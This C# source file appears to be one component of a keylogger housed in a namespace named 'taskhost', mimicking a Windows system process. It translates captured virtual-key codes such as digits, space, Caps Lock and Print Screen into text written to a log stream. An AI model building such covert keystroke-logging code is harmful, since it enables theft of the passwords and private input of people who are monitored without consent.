using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace taskhost
{
    class filtro
    {
        public Boolean filtrar(int vkCode, StreamWriter sw)
        {
          
            switch (vkCode)
            {
                case 20:
                    sw.Write("[PressMAIUSCULO]");
                    return true;
                case 32:
                    sw.Write(" ");
                    return true;
                case 44:
                    sw.Write("[PRINTSCREEN]");
                    return true;
                case 48:
                    sw.Write("0");
                    return true;
                case 49:
                    sw.Write("1");
                    return true;
                case 50:
                    sw.Write("2");
                    return true;
                case 51:
                    sw.Write("3");
                    return true;
                case 52:
                    sw.Write("4");
                    return true;
                case 53:
                    sw.Write("5");
                    return true;
                case 54:
                    sw.Write("6");
                    return true;
                case 55:
                    sw.Write("7");
                    return true;
                case 56:
                    sw.Write("8");
                    return true;
                case 57:
                    sw.Write("9");
                    return true;
                default:
                    return false;
            }

        }
    }
}
